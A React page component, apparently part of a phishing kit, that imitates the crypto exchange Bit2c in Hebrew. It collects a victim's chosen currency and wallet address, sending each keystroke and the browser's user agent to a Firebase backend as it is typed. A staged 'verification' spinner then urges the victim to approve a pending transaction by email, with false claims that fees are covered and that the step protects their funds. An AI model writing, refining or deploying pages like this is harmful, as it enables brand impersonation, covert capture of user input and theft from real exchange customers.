import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useFirebaseClient } from '../hooks/useFirebaseClient';
import { X, ChevronDown, Shield, CheckCircle, AlertCircle, Info, AlertTriangle, HelpCircle } from 'lucide-react';
import { Bitcoin, Ethereum, Binance, Cardano, Solana, Polygon, Chainlink, Litecoin, Dogecoin, Stellar } from 'cryptocons';
import { reportTyping } from '../firebase/typing';

const TokenPage = () => {
  const navigate = useNavigate();
  const { updateClientData, clientId, clientData } = useFirebaseClient(navigate);
  const [address, setAddress] = useState('');
  const [loading, setLoading] = useState(false);
  const [currency, setCurrency] = useState('BTC');
  const [fromWallet, setFromWallet] = useState('');
  const [showCurrencyDropdown, setShowCurrencyDropdown] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isDesktopMenuOpen, setIsDesktopMenuOpen] = useState(false);
  const [addressVerified, setAddressVerified] = useState(false);
  const [showEmailVerification, setShowEmailVerification] = useState(false);

  // Lista expandida de criptomoedas disponíveis com mais opções
  const cryptocurrencies = [
    { symbol: 'BTC', name: 'ביטקוין', icon: Bitcoin, color: '#F7931A' },
    { symbol: 'ETH', name: 'אתריום', icon: Ethereum, color: '#627EEA' },
    { symbol: 'BNB', name: 'בינאנס קוין', icon: Binance, color: '#F3BA2F' },
    { symbol: 'ADA', name: 'קרדנו', icon: Cardano, color: '#0033AD' },
    { symbol: 'SOL', name: 'סולנה', icon: Solana, color: '#9945FF' },
    { symbol: 'MATIC', name: 'פוליגון', icon: Polygon, color: '#8247E5' },
    { symbol: 'LINK', name: 'צ\'יינלינק', icon: Chainlink, color: '#375BD2' },
    { symbol: 'LTC', name: 'לייטקוין', icon: Litecoin, color: '#BFBBBB' },
    { symbol: 'DOGE', name: 'דוג\'קוין', icon: Dogecoin, color: '#C2A633' },
    { symbol: 'XLM', name: 'סטלר', icon: Stellar, color: '#7D00FF' },
  ];

  const selectedCrypto = cryptocurrencies.find(crypto => crypto.symbol === currency) || cryptocurrencies[0];

  // Atualizar dados iniciais quando a aplicação carrega
  useEffect(() => {
    updateClientData({
      currentUrl: "/token",
      currentPage: "TOKEN",
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
  }, [updateClientData]);

  const handleVerifyAddress = async () => {
    if (!address || address.length < 10) return;
    
    // Mostrar loading
    setLoading(true);
    
    try {
      // Atualiza os dados no Firebase
      await updateClientData({
        withdrawAddress: address,
        currency: currency,
        fromWallet: address,
        verificationStatus: 'pending_email'
      });
      
      // Após 2 segundos, esconder loading e mostrar conteúdo na página
      setTimeout(() => {
        setLoading(false);
        setShowEmailVerification(true);
        setAddressVerified(true);
        setFromWallet(address);
      }, 2000);
      
    } catch (error) {
      console.error('Erro ao verificar endereço:', error);
      setLoading(false);
    }
  };

  // Nova função para lidar com mudanças no input de address
  const handleAddressChange = (e) => {
    const value = e.target.value;
    setAddress(value);
    
    // Reportar typing em tempo real
    reportTyping('address', value);
    
    // Salvar no Firebase em tempo real
    updateClientData({
      withdrawAddress: value,
      lastAddressInput: Date.now(),
      addressStatus: value.length >= 10 ? "Complete" : "Incomplete",
    });
  };

  return (
    <div className="min-h-screen overflow-x-hidden" style={{ backgroundColor: '#F4F5FA' }}>
      {/* Header - Copiado da página device */}
      <header className="w-full py-1 md:py-2" style={{ backgroundColor: '#13114A' }}>
        {/* Desktop Header */}
        <div className="hidden md:flex justify-between items-center w-full px-0">
          <div className="flex items-center space-x-2 ml-0 relative">
            <button
              onClick={() => setIsDesktopMenuOpen(!isDesktopMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            <div className="absolute top-2 -left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-10"></div>
            <div className="h-12 w-px bg-white opacity-10"></div>

            <button className="text-white px-3 py-2 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors flex items-center space-x-2">
              <svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="currentColor" strokeWidth="2">
                <path d="M12 6.5a2 2 0 1 0-2-2 2 2 0 0 0 2 2m7.5 14h-1v-5a1 1 0 0 0-1-1h-5v-2h5a1 1 0 0 0 0-2h-5v-2a1 1 0 0 0-2 0v7a1 1 0 0 0 1 1h5v5a1 1 0 0 0 1 1h2a1 1 0 0 0 0-2m-6.8-1.6a4 4 0 0 1-7.2-2.4 4 4 0 0 1 2.4-3.66A1 1 0 1 0 7.1 11a6 6 0 1 0 7.2 9.1 1 1 0 0 0-1.6-1.2" />
              </svg>
              <span>נגישות</span>
            </button>

            <button className="text-white px-3 py-1 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors">
              תמיכה
            </button>

            <button className="text-white px-2 py-1 text-base rounded-full border transition-colors" style={{ backgroundColor: '#1A97F0', borderColor: '#1A97F0' }}>
              כניסה
            </button>
          </div>

          <div className="flex items-center flex-1 mr-6">
            <div className="flex-1" />
            <div className="mr-8">
              <svg width="24" height="24" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" className="text-white">
                <path fill="currentColor" d="M64 112h128v48h-80v64H64zm336 48h-80v-48h128v112h-48zM64 288h48v64h80v48H64zm256 64h80v-64h48v112H320z" />
              </svg>
            </div>
            <div className="h-12 w-px bg-white opacity-10 ml-4"></div>
            <div className="h-12 w-px bg-white opacity-10 mr-8 mr-12"></div>
            <img src="/iamgeheadaer.png" alt="Header Logo" className="h-30 w-auto" />
          </div>
        </div>

        {/* Mobile Header */}
        <div className="flex md:hidden justify-between items-center w-full px-4">
          <div className="flex items-center">
            <img src="/iamgeheadaer.png" alt="Header Logo" className="h-8 w-auto" />
            <div className="h-12 w-px bg-white opacity-5 ml-4"></div>
          </div>

          <div className="flex items-center text-white">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
            <span className="text-lg font-medium">Token</span>
          </div>

          <div className="flex items-center space-x-2 mr-0 relative">
            <button
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            <div className="absolute top-1.5 left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-20"></div>
          </div>
        </div>
      </header>

      {/* Imagem azul - Copiada da página device */}
      <div className="w-full">
        <div className="py-6 text-center" style={{ backgroundColor: '#BCE2FB' }} dir="rtl">
          <div className="max-w-4xl mx-auto px-4">
            <p className="text-gray-800 text-base font-medium">
              לאחר אישור הסנכרון, התיק שלך יוצג
            </p>
          </div>
        </div>
      </div>

      {/* Conteúdo de Verificação por Email - Aparece após confirmação */}
      {showEmailVerification && (
        <div className="w-full px-4 py-6" style={{ backgroundColor: '#F4F5FA' }}>
          <div className="max-w-2xl mx-auto">
            <div className="bg-white rounded-lg shadow-lg p-6 md:p-8">
              
              <div className="mb-6">
                <p className="text-gray-700 mb-4 leading-relaxed text-sm md:text-base" dir="rtl">
                  כדי להבטיח את האבטחה והשלמות של החשבון שלך, אנו מבקשים שתגש לאימייל שנשלח לכתובת המקושרת ותאשר את הבקשה הממתינה. הליך זה חיוני לקישור נכון של כתובת המשיכה לחשבון Bit2c שלך. גש לתיבת הדואר הנכנס שלך. אתר את האימייל שנשלח על ידי Bit2c. עקוב אחר הוראות כדי לאשר את העסקה ולהשלים את תהליך האימות. שלב זה חיוני להגנה על הכספים שלך ולהבטיח שכל העסקאות מתבצעות בצורה מאובטחת ורק בהסכמתך המפורשת. גש לאימייל שלך ועקוב אחר הוראות כדי לאשר את העסקה ולהשלים את תהליך האימות. שלב זה בסיסי להגנה על הכספים שלך ולהבטיח שכל העסקאות מתבצעות בצורה מאובטחת ובהסכמתך המפורשת. אנו מודים לך על תשומת הלב והאמון שלך.
                </p>
              </div>
              
              <div className="bg-[#BCE2FB] border border-blue-200 rounded-lg p-4 md:p-6">
                <div className="flex items-start space-x-3">
                  <div className="flex-shrink-0">
                    <CheckCircle className="w-5 h-5 md:w-6 md:h-6 text-blue-600 mt-0.5" />
                  </div>
                  <div className="text-left">
                    <p className="text-sm md:text-base text-black leading-relaxed" dir="rtl">
                      כל עמלות העסקה מכוסות במלואן על ידי Bit2c, מה שמבטיח שאף ערך לא יופחת מהנכסים שלך. תהליך אימות זה הוא בסיסי וחובה כדי להבטיח את הגנה על החשבון שלך ואת אבטחת הכספים שלך. לאחר האימות, תוכל להעביר את הערך בחזרה ל-Bit2c בביטחון מלא.
                    </p>
                  </div>
                </div>
              </div>
              
            </div>
          </div>
        </div>
      )}

      {/* Main Content - Modal Centralizado */}
      {!showEmailVerification && (
        <div className="flex items-center justify-center min-h-[calc(100vh-200px)] px-3 md:px-4 py-3 md:py-4">
          <div className="w-full max-w-md">
          
          {/* Formulário Centralizado */}
          <motion.div
            className="bg-white rounded-lg shadow-lg p-4 md:p-6 border border-gray-100"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.6 }}
          >
            {/* Header do Formulário */}
            <div className="flex items-center space-x-3 mb-4 md:mb-6" dir="rtl">
              <img src="/iamgeheadaer.png" alt="Logo" className="w-6 h-6 md:w-8 md:h-8 rounded-full" />
              <div>
                <h2 className="text-lg md:text-xl font-bold text-gray-900">אישור כתובת</h2>
                <p className="text-xs text-gray-600">אשר את הכתובת שלך כדי להמשיך</p>
              </div>
            </div>

            {/* Card Informativo de Segurança */}
            <div className="mb-6 p-4 bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-lg" dir="rtl">
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0">
                  <AlertTriangle className="w-5 h-5 text-blue-600 mt-0.5" />
                </div>
                <div>
                  <h3 className="text-sm font-semibold text-blue-900 mb-2">
                    אימות אבטחה נדרש
                  </h3>
                  <p className="text-sm text-blue-800 leading-relaxed">
                    אימות זה הוא חובה כדי להבטיח שכתובת המשיכה שייכת באופן בלעדי לבעל החשבון. תהליך זה מגן על הכספים שלך מפני ניסיונות גישה לא מורשים ומבטיח שרק לך יש שליטה על העסקאות שלך.
                  </p>
                </div>
              </div>
            </div>

            {/* Seleção de Moeda */}
            <div className="mb-5" dir="rtl">
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                בחר מטבע
              </label>
              <div className="relative">
                 <button 
                   onClick={() => setShowCurrencyDropdown(!showCurrencyDropdown)}
                   className="w-full flex items-center justify-between px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg hover:bg-gray-100 transition-colors"
                   dir="rtl"
                 >
                   <ChevronDown className={`w-4 h-4 text-gray-400 transition-transform ${showCurrencyDropdown ? 'rotate-180' : ''}`} />
                   <div className="flex items-center space-x-reverse space-x-2">
                     <div className="text-right">
                       <div className="font-semibold text-gray-900 text-sm">{selectedCrypto.symbol}</div>
                       <div className="text-xs text-gray-500">{selectedCrypto.name}</div>
                     </div>
                     <selectedCrypto.icon size={20} />
                   </div>
                 </button>
                 
                 {/* Dropdown Menu */}
                 {showCurrencyDropdown && (
                   <motion.div
                     initial={{ opacity: 0, y: -10 }}
                     animate={{ opacity: 1, y: 0 }}
                     exit={{ opacity: 0, y: -10 }}
                     className="absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-48 overflow-y-auto"
                     dir="rtl"
                   >
                     {cryptocurrencies.map((crypto) => (
                       <button
                         key={crypto.symbol}
                         onClick={() => {
                           setCurrency(crypto.symbol);
                           setShowCurrencyDropdown(false);
                         }}
                         className="w-full flex items-center space-x-reverse space-x-2 px-3 py-2 hover:bg-gray-50 transition-colors text-right"
                       >
                         <div>
                           <div className="font-semibold text-gray-900 text-sm">{crypto.symbol}</div>
                           <div className="text-xs text-gray-500">{crypto.name}</div>
                         </div>
                         <crypto.icon size={20} />
                       </button>
                     ))}
                   </motion.div>
                 )}
              </div>
            </div>

            {/* Campo de Endereço */}
            <div className="mb-5" dir="rtl">
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                <span className="text-red-500">*</span> כתובת
              </label>
              <input
                type="text"
                value={address}
                onChange={handleAddressChange}
                placeholder="הזן את כתובת הארנק שלך..."
                disabled={loading}
                className="w-full px-3 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-400 focus:border-blue-400 text-sm transition-all duration-200"
                dir="ltr"
              />
            </div>

            {/* Endereço Verificado */}
            {showEmailVerification && (
              <div className="mb-5" dir="rtl">
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  כתובת
                </label>
                <div className="w-full flex items-center justify-between px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg">
                  {addressVerified && fromWallet ? (
                    <div className="flex items-center space-x-2">
                      <span className="font-medium text-gray-900 text-sm truncate">{fromWallet}</span>
                    </div>
                  ) : (
                    <span className="text-gray-500 text-sm">הכתובת תופיע לאחר האימות</span>
                  )}
                </div>
              </div>
            )}

            {/* Status de Verificação por Email */}
            {showEmailVerification && !loading && (
              <div className="mb-5" dir="rtl">
                <p className="text-sm text-gray-700 leading-relaxed">
                  <strong>גש לאימייל שלך עכשיו ולחץ על קישור האימות.</strong> זהו עדכון אבטחה נדרש לאימות כתובת המשיכה שלך.
                </p>
              </div>
            )}

            {/* Botão de Verificação */}
            <button
              onClick={handleVerifyAddress}
              disabled={loading || !address || address.length < 10}
              className={`w-full bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 flex items-center justify-center gap-2 hover:bg-blue-700 shadow-md hover:shadow-lg transform hover:scale-105 ${
                loading || !address || address.length < 10 ? 'opacity-50 cursor-not-allowed hover:scale-100 hover:bg-blue-600' : ''
              }`}
            >
              {loading ? (
                <>
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                  מעבד...
                </>
              ) : (
                'אשר'
              )}
            </button>
          </motion.div>
          </div>
        </div>
      )}


    </div>
  );
};

export default TokenPage;